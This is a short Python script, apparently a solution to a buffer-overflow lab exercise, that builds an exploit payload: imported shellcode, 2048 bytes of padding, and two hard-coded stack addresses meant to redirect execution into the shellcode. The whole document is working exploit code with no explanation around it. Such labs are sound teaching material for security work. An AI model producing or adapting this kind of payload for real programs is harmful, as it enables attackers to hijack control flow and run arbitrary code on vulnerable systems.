#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
shell_len = len(shellcode)
padding_len = (2048 - shell_len)
output=shellcode + (b"\x32"*padding_len) + b"\x6C\xB3\xfe\xff"+ b"\x68\xb3\xfe\xff" 
sys.stdout.buffer.write(output)
